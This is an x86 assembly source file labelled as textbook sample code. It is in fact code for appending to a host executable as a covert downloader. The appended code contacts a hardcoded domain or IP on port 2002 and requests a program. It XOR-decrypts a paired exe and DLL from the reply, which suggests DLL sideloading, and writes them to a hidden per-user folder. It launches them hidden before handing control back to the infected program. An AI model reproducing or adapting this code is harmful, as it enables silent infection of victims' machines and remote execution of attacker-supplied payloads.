;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; Sample code for < Win32ASM Programming 2nd Edition>
; by 罗云彬, http://asm.yeah.net
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 要被添加到目标文件后面的执行代码
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 一些函数的原形定义
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_ProtoRtlGetLastWin32Error	typedef proto
_ProtoVirtualAlloc		typedef proto 	:dword,:dword,:dword,:dword
_ProtoVirtualFree		typedef proto	:dword,:dword,:dword
_ProtolstrcatA			typedef	proto	:dword,:dword
_ProtolstrlenA			typedef	proto	:dword
_ProtolstrcpyA			typedef proto  	:dword,:dword
_ProtoGetProcAddress	typedef	proto	:dword,:dword
_ProtoLoadLibrary		typedef	proto	:dword
_ProtoMessageBoxA		typedef	proto	:dword,:dword,:dword,:dword
_ProtowsprintfA			typedef proto	:dword,:dword,:dword
_ProtoNetWkstaGetInfo	typedef proto	:dword,:dword,:dword
_ProtoNetApiBufferFree	typedef	proto	:dword
_ProtoWSAStartup		typedef proto 	:dword,:dword
_Protontohs				typedef	proto 	:dword
_Protoinet_addr			typedef	proto	:dword
_Protosocket			typedef	proto	:dword,:dword,:dword
_Protoconnect			typedef	proto 	:dword,:dword,:dword	
_Protosend				typedef	proto	:dword,:dword,:dword,:dword
_Protorecv				typedef	proto	:dword,:dword,:dword,:dword
_Protogethostbyname		typedef proto	:dword
_Protoclosesocket		typedef proto	:dword
_ProtoCreateFileA		typedef	proto	:dword,:dword,:dword,:dword,:dword,:dword,:dword
_ProtoWriteFile			typedef	proto	:dword,:dword,:dword,:dword,:dword
_ProtoCloseHandle		typedef	proto	:dword
_ProtoWinExec			typedef proto 	:dword,:dword
_ProtoGetUserNameA		typedef proto	:dword,:dword
_ProtoShellExecuteA		typedef proto	:dword,:dword,:dword,:dword,:dword,:dword
_ProtoMakeSureDirectoryPathExists	typedef proto	:dword


_ApiRtlGetLastWin32Error typedef ptr _ProtoRtlGetLastWin32Error
_ApiVirtualAlloc		typedef ptr _ProtoVirtualAlloc
_ApiVirtualFree			typedef ptr _ProtoVirtualFree
_ApilstrcatA			typedef	ptr	_ProtolstrcatA
_ApilstrlenA			typedef	ptr	_ProtolstrlenA
_ApilstrcpyA			typedef ptr _ProtolstrcpyA
_ApiwsprintfA			typedef ptr _ProtowsprintfA
_ApiGetProcAddress		typedef	ptr	_ProtoGetProcAddress
_ApiLoadLibrary			typedef	ptr	_ProtoLoadLibrary
_ApiMessageBoxA			typedef	ptr	_ProtoMessageBoxA
_ApiWSAStartup			typedef ptr _ProtoWSAStartup
_Apintohs				typedef	ptr	_Protontohs
_Apiinet_addr			typedef	ptr	_Protoinet_addr
_Apisocket				typedef	ptr	_Protosocket
_Apiconnect				typedef	ptr	_Protoconnect	
_Apisend				typedef	ptr	_Protosend
_Apirecv				typedef	ptr	_Protorecv
_Apigethostbyname		typedef ptr _Protogethostbyname
_Apiclosesocket			typedef ptr _Protoclosesocket
_ApiCreateFileA			typedef	ptr	_ProtoCreateFileA
_ApiWriteFile			typedef	ptr	_ProtoWriteFile
_ApiCloseHandle			typedef	ptr	_ProtoCloseHandle
_ApiWinExec				typedef ptr _ProtoWinExec
_ApiMakeSureDirectoryPathExists	typedef ptr _ProtoMakeSureDirectoryPathExists
_ApiGetUserNameA		typedef ptr _ProtoGetUserNameA
_ApiShellExecuteA		typedef ptr _ProtoShellExecuteA
_ApiNetWkstaGetInfo		typedef ptr _ProtoNetWkstaGetInfo
_ApiNetApiBufferFree 	typedef ptr _ProtoNetApiBufferFree
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



APPEND_CODE	equ	this byte

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 被添加到目标文件中的代码从这里开始
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
include		_GetKernel.asm
include 	ws2_32.inc
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>





MAX_RECVBUFFER_SIZE	EQU 100000h
WSA_VERSION			EQU 202h
SERVER_PORT			EQU 2002
CRYPT_KEY_SIZE		EQU 16


;SERVER_HOST_IP equ 0
SERVER_HOST_URL equ 0
ifdef SERVER_HOST_URL
szServerHost		db 'www.eyw168.com',0
endif

ifdef SERVER_HOST_IP
;szServerIP			db '10.0.2.15',0
;szServerIP			db '1.32.216.22',0
szServerIP			db '1.32.200.51',0
;szServerIP			db '192.168.3.129',0
endif

szUser32			db	'user32',0
szWS2_32			db 	'ws2_32',0
szDbghelp 			db 	'dbghelp',0
szShell32			db	'shell32',0
szAdvapi32			db	'advapi32',0
szNetapi32			db 	'netapi32',0
szNtdll				db	'ntdll',0

szGetUserNameA		db 	'GetUserNameA',0
szShellExecuteA 	db  'ShellExecuteA',0
szMakeSureDirectoryPathExists db 'MakeSureDirectoryPathExists',0
szRtlGetLastWin32Error	db 'RtlGetLastWin32Error',0
szLoadLibrary		db	'LoadLibraryA',0
szGetProcAddress 	db	'GetProcAddress',0
szNetWkstaGetInfo	db 	'NetWkstaGetInfo',0
szNetApiBufferFree 	db 	'NetApiBufferFree',0
szMessageBoxA		db	'MessageBoxA',0
szWSAStartup		db 	'WSAStartup',0
szntohs				db 	'ntohs',0
szinet_addr			db 	'inet_addr',0
szsocket			db 	'socket',0
szconnect			db	'connect',0
szsend				db	'send',0
szrecv				db 	'recv',0
szgethostbyname		db 	'gethostbyname',0
szclosesocket		db	'closesocket',0
szwsprintfA			db	'wsprintfA',0
szCreateFileA		db	'CreateFileA',0
szWriteFile			db	'WriteFile',0
szCloseHandle		db	'CloseHandle',0
szWinExec			db 	'WinExec',0
szVirtualAlloc		db	'VirtualAlloc',0
szVirtualFree		db	'VirtualFree',0
szlstrlenA			db	'lstrlenA',0
szlstrcatA			db 	'lstrcatA',0
szlstrcpyA			db 	'lstrcpyA',0
szVistaAbovePathFormat	db	'c:\users\%s\appdata\local\services\',0
szXPPathFormat			db	'c:\documents and settings\%s\local settings\services\',0
szQuatationFormat	db	'"%s" "%s"',0
szLoadProgramCmd	db	'LOADPROGRAM',0
szShellExecuteAOpen	db 	'open',0
szShellExecuteAParam db 'STARTFIRSTTIME',0







;********************************************************************
; 新的入口地址
;********************************************************************
_NewEntry proc
;********************************************************************
; 重定位并获取一些 API 的入口地址
;********************************************************************
	
	
		pushad
		jmp _Confusion
		szUserName			db 32 dup (?)
		szExePath			db 128 dup (?)
		szDllPath			db 128 dup (?)
		szWhiteExeName		db 32 dup(?)
		szBlackDllName		db 32 dup(?)
		lpProgramBuf		dd ?
		dwRecvLen			dd ?
		socketServer		dd ?
		iCount				dd ?
		LPWKSTA_INFO_100	dd ?
		sockaddrServer 		sockaddr_in <?>
		WsaData				WSADATA		<?>
		hDllWS2_32 							dd 	?
		hDllKernel32						dd	?
		hDllUser32							dd	?
		hDllShell32							dd 	?
		hDllAdvapi32						dd	?
		hDllDbghelp							dd	?
		hDllNetapi32						dd	?
		hDLlNtdll							dd 	?

		_RtlGetLastWin32Error 	_ApiRtlGetLastWin32Error ?
		_VirtualAlloc			_ApiVirtualAlloc		?
		_VirtualFree			_ApiVirtualFree			?
		_lstrcatA				_ApilstrcatA			?
		_lstrlenA				_ApilstrlenA			?
		_lstrcpyA				_ApilstrcpyA			?
		_GetProcAddress			_ApiGetProcAddress		?
		_LoadLibrary			_ApiLoadLibrary			?
		_MessageBoxA			_ApiMessageBoxA			?
		_wsprintfA				_ApiwsprintfA			?
		_WSAStartup				_ApiWSAStartup			?
		_ntohs 					_Apintohs				?
		_inet_addr 				_Apiinet_addr			?
		_socket 				_Apisocket				?
		_connect 				_Apiconnect				?
		_send 					_Apisend				?
		_recv 					_Apirecv				?
		_gethostbyname			_Apigethostbyname		?
		_closesocket			_Apiclosesocket			?
		_CreateFileA 			_ApiCreateFileA			?
		_WriteFile 				_ApiWriteFile			?
		_CloseHandle 			_ApiCloseHandle			?
		_WinExec				_ApiWinExec				?
		_GetUserNameA			_ApiGetUserNameA		?
		_ShellExecuteA			_ApiShellExecuteA		?
		_MakeSureDirectoryPathExists 	_ApiMakeSureDirectoryPathExists ?
		_NetWkstaGetInfo 				_ApiNetWkstaGetInfo		?
		_NetApiBufferFree 				_ApiNetApiBufferFree 	?
_Confusion:
		call	@F
		@@:
		pop	ebx
		sub	ebx,offset @B	
;********************************************************************
		invoke	_GetKernelBase,[esp+32]	;获取Kernel32.dll基址
		.if	! eax
			jmp	_ToOldEntry
		.endif
		mov	[ebx+hDllKernel32],eax	;获取GetProcAddress入口
		
		lea	eax,[ebx+szGetProcAddress]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_GetProcAddress],eax
		
		lea	eax,[ebx+szLoadLibrary]	;获取LoadLibrary入口
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
		mov	[ebx+_LoadLibrary],eax

		lea	eax,[ebx+szCreateFileA]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_CreateFileA],eax
		
		lea	eax,[ebx+szWriteFile]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_WriteFile],eax
		
		lea	eax,[ebx+szCloseHandle]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_CloseHandle],eax
		
		lea	eax,[ebx+szVirtualAlloc]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_VirtualAlloc],eax
		
		lea	eax,[ebx+szVirtualFree]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_VirtualFree],eax
		
		lea	eax,[ebx+szlstrcatA]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_lstrcatA],eax
		
		lea	eax,[ebx+szlstrlenA]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_lstrlenA],eax
		
		lea	eax,[ebx+szlstrcpyA]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_lstrcpyA],eax
		
		lea	eax,[ebx+szWinExec]
		invoke	_GetApi,[ebx+hDllKernel32],eax
		mov	[ebx+_WinExec],eax
;********************************************************************
		lea	eax,[ebx+szWS2_32]	;获取ws2_32.dll基址
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllWS2_32],eax
		
		lea	eax,[ebx+szWSAStartup]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_WSAStartup],eax
		
		lea	eax,[ebx+szntohs]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_ntohs],eax
		
		lea	eax,[ebx+szinet_addr]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_inet_addr],eax
		
		lea	eax,[ebx+szsocket]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_socket],eax
		
		lea	eax,[ebx+szconnect]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_connect],eax
		
		lea	eax,[ebx+szsend]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_send],eax
		
		lea	eax,[ebx+szrecv]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_recv],eax
		
		lea	eax,[ebx+szclosesocket]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_closesocket],eax
		
		
		lea	eax,[ebx+szgethostbyname]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllWS2_32],eax
		mov	[ebx+_gethostbyname],eax
		
;********************************************************************		
		lea	eax,[ebx+szUser32]	;获取User32.dll基址
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllUser32],eax
		
		lea	eax,[ebx+szwsprintfA]
		invoke	[ebx+_GetProcAddress],[ebx+hDllUser32],eax
		mov	[ebx+_wsprintfA],eax
		
		lea	eax,[ebx+szMessageBoxA]	;获取MessageBox入口
		invoke	[ebx+_GetProcAddress],[ebx+hDllUser32],eax
		mov	[ebx+_MessageBoxA],eax	
;********************************************************************
		lea	eax,[ebx+szDbghelp]
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllDbghelp],eax
		
		lea	eax,[ebx+szMakeSureDirectoryPathExists]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllDbghelp],eax
		mov	[ebx+_MakeSureDirectoryPathExists],eax	
;********************************************************************
		lea	eax,[ebx+szShell32]
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllShell32],eax
		lea	eax,[ebx+szShellExecuteA]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllShell32],eax
		mov	[ebx+_ShellExecuteA],eax	
;********************************************************************		
		lea	eax,[ebx+szAdvapi32]
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllAdvapi32],eax
		lea	eax,[ebx+szGetUserNameA]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllAdvapi32],eax
		mov	[ebx+_GetUserNameA],eax	
;********************************************************************		
		lea	eax,[ebx+szNtdll]
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDLlNtdll],eax
		lea	eax,[ebx+szRtlGetLastWin32Error]	
		invoke	[ebx+_GetProcAddress],[ebx+hDLlNtdll],eax
		mov	[ebx+_RtlGetLastWin32Error],eax	
;********************************************************************			
		mov dword ptr [ebx+iCount],sizeof szUserName
		lea ecx,[ebx +iCount]
		lea	eax,[ebx+szUserName]
		invoke	[ebx+_GetUserNameA],eax,ecx
		;lea	ecx,[ebx+szUserName]
		;lea	eax,[ebx+szUserName]
		;invoke	[ebx+_MessageBoxA],NULL,ecx,eax,MB_YESNO or MB_ICONQUESTION

		lea	eax,[ebx+szNetapi32]
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllNetapi32],eax
		lea	eax,[ebx+szNetWkstaGetInfo]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllNetapi32],eax
		mov	[ebx+_NetWkstaGetInfo],eax	
		lea	eax,[ebx+szNetApiBufferFree]	
		invoke	[ebx+_GetProcAddress],[ebx+hDllNetapi32],eax
		mov	[ebx+_NetApiBufferFree],eax	
		lea eax,[ebx+LPWKSTA_INFO_100]
		invoke	[ebx+_NetWkstaGetInfo],0,100,eax
		mov esi,[ebx+LPWKSTA_INFO_100]
		mov eax,[esi+12]
		mov ecx,[esi + 16]
		and eax,0ffffh
		shl eax,16
		and ecx,0ffffh
		or eax,ecx
		.if eax >= 60000h 
			lea eax,[ebx+szExePath]
			lea ecx,[ebx+szVistaAbovePathFormat]
			lea edx,[ebx+szUserName]
			invoke [ebx+_wsprintfA],eax,ecx,edx
			add esp,12
		.elseif eax < 60000h
			lea eax,[ebx+szExePath]
			lea ecx,[ebx+szXPPathFormat]
			lea edx,[ebx+szUserName]
			invoke [ebx+_wsprintfA],eax,ecx,edx
			add esp,12
		.else
		.endif
		
		;lea	ecx,[ebx+szExePath]
		;lea	eax,[ebx+szExePath]
		;invoke	[ebx+_MessageBoxA],NULL,ecx,eax,MB_YESNO or MB_ICONQUESTION
		lea eax,[ebx+LPWKSTA_INFO_100]
		invoke [ebx + _NetApiBufferFree],eax
;********************************************************************
		lea eax,[ebx + szExePath]
		invoke [ebx+_MakeSureDirectoryPathExists],eax

		lea eax,[ebx +WsaData]
		invoke [ebx+_WSAStartup],WSA_VERSION,eax
		.if eax != 0
			jmp	_ToOldEntry
		.endif
		
		invoke [ebx+_socket],AF_INET,SOCK_STREAM,IPPROTO_TCP
		.if eax == INVALID_SOCKET
			jmp	_ToOldEntry
		.endif
		mov [ebx + socketServer],eax
		
		lea esi,[ebx+sockaddrServer]
		mov dword ptr [esi],AF_INET
		invoke [ebx+_ntohs],SERVER_PORT
		mov dword ptr [esi+2],eax
ifdef SERVER_HOST_IP
		lea eax,[ebx+szServerIP]
		invoke [ebx+_inet_addr],eax
		mov dword ptr [esi+4],eax
else
		lea eax,[ebx+szServerHost]
		invoke [ebx+_gethostbyname],eax
		mov eax,[eax + 12]
		mov eax,[eax]
		mov eax,[eax]
		mov dword ptr [esi+4],eax
endif
		
		
		lea eax,[ebx+sockaddrServer]
		invoke [ebx +_connect],[ebx +socketServer],eax,sizeof sockaddr_in
		.if eax == INVALID_SOCKET
			invoke [ebx+_RtlGetLastWin32Error]
			jmp	_ToOldEntry
		.endif

		lea eax,[ebx+szLoadProgramCmd]
		invoke [ebx+_send],[ebx +socketServer],eax,sizeof szLoadProgramCmd - 1,0
		.if eax == INVALID_SOCKET || eax == 0
			invoke [ebx+_RtlGetLastWin32Error]
			jmp	_ToOldEntry
		.endif
		
		mov [ebx +iCount],MAX_RECVBUFFER_SIZE
		invoke [ebx+_VirtualAlloc],0,[ebx+iCount],MEM_COMMIT,PAGE_READWRITE
		.if eax == 0
			jmp	_ToOldEntry
		.endif
		mov [ebx+lpProgramBuf],eax
		
		mov edi,[ebx+lpProgramBuf]
		mov [ebx +dwRecvLen],0
_RECVDATAFROMSERVER:
		invoke [ebx+_recv],[ebx +socketServer],edi,[ebx+iCount],0
		.if eax == INVALID_SOCKET
			jmp	_ToOldEntry
		.endif
		add [ebx+dwRecvLen],eax
		mov esi,[ebx+lpProgramBuf]
		mov ecx,[esi]
		.if [ebx+dwRecvLen] < ecx
			sub [ebx+iCount],eax
			add edi,eax
			jmp _RECVDATAFROMSERVER
		.endif
		
		invoke [ebx+_closesocket],[ebx+socketServer]
		
		mov edx,4
		add edx,4
		mov esi,[ebx+lpProgramBuf]
		add esi,edx
		mov ecx,[esi]
		add esi,4
		lea edi,[ebx +szWhiteExeName]
_GetExeName:
		mov al,[esi]
		mov [edi],al
		inc esi
		inc edi
		dec ecx
		.if ecx !=0 
			jmp _GetExeName
		.endif
		mov ecx,[esi]
		add esi,4
		push esi
		push ecx
		mov edi,[ebx+lpProgramBuf]
		add edi,[ebx+dwRecvLen]
		sub edi,CRYPT_KEY_SIZE
		mov edx,0
_DecryptWhiteExe:
		mov al,[esi]
		xor al,[edi+edx]
		mov [esi],al
		inc esi
		inc edx
		.if edx == CRYPT_KEY_SIZE
			mov edx,0
		.endif
		dec ecx
		.if ecx != 0
			jmp _DecryptWhiteExe
		.endif


		lea eax,[ebx+szExePath]
		lea ecx,[ebx+szDllPath]
		invoke [ebx+_lstrcpyA],ecx,eax
		
		lea eax,[ebx+szExePath]
		lea ecx,[ebx+szWhiteExeName]
		invoke [ebx+_lstrcatA],eax,ecx

		lea edi,[ebx +szExePath]
		invoke [ebx+_CreateFileA],edi,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
		.if eax == INVALID_HANDLE_VALUE
			jmp _ToOldEntry
		.endif
		mov edx,eax
		
		pop ecx
		pop esi
		push ecx
		push esi
		lea eax,[ebx+iCount]
		push edx
		invoke [ebx+_WriteFile],edx,esi,ecx,eax,0
		pop edx
		invoke [ebx+_CloseHandle],edx

		pop esi
		pop ecx
		add esi,ecx
		mov ecx,[esi]
		add esi,4
		lea edi,[ebx+szBlackDllName]
_GetDllName:
		mov al,[esi]
		mov [edi],al
		inc esi
		inc edi
		dec ecx
		.if ecx !=0 
			jmp _GetDllName
		.endif
		mov ecx,[esi]
		add esi,4

		push esi
		push ecx
		mov edi,[ebx+lpProgramBuf]
		add edi,[ebx+dwRecvLen]
		sub edi,CRYPT_KEY_SIZE
		mov edx,0
_DecryptBlackDll:
		mov al,[esi]
		xor al,[edi+edx]
		mov [esi],al
		inc esi
		inc edx
		.if edx == CRYPT_KEY_SIZE
			mov edx,0
		.endif
		dec ecx
		.if ecx != 0
			jmp _DecryptBlackDll
		.endif

		lea eax,[ebx+szDllPath]
		lea ecx,[ebx+szBlackDllName]
		invoke [ebx+_lstrcatA],eax,ecx
		lea edi,[ebx +szDllPath]
		invoke [ebx+_CreateFileA],edi,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
		.if eax == INVALID_HANDLE_VALUE
			jmp _ToOldEntry
		.endif
		mov edx,eax
		
		pop ecx
		pop esi
		lea eax,[ebx+iCount]
		push edx
		invoke [ebx+_WriteFile],edx,esi,ecx,eax,0
		pop edx
		invoke [ebx+_CloseHandle],edx
		
		invoke [ebx+_VirtualFree],[ebx+lpProgramBuf],MAX_RECVBUFFER_SIZE,MEM_DECOMMIT
		invoke [ebx+_VirtualFree],[ebx+lpProgramBuf],0,MEM_RELEASE

		lea esi,[ebx+szShellExecuteAParam]
		push esi
		lea edx,[ebx+szExePath]
		push edx
		lea ecx,[ebx+szQuatationFormat]
		push ecx
		lea eax,[ebx+szDllPath]
		push eax
		;invoke [ebx+_wsprintfA],eax,ecx,edx,esi
		call [ebx+_wsprintfA]
		add esp,16

		;lea	eax,[ebx+szDllPath]
		;invoke	[ebx+_MessageBoxA],NULL,eax,eax,MB_YESNO or MB_ICONQUESTION
		
		;lea eax,[ebx+szShellExecuteAOpen]
		;lea ecx,[ebx+szDllPath]
		;lea edx,[ebx+szShellExecuteAParam]
		;invoke [ebx+_ShellExecuteA],0,eax,ecx,edx,0,0
		lea eax,[ebx+szDllPath]
		invoke [ebx+_WinExec],eax,SW_HIDE
		popad
		jmp _ToOldEntry

_NewEntry endp
;********************************************************************
; 执行原来的文件
;********************************************************************
_ToOldEntry:
		db	0e9h	;0e9h是jmp xxxxxxxx的机器码
_dwOldEntry:
		dd	?	;用来填入原来的入口地址
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

APPEND_CODE_END	equ	this byte
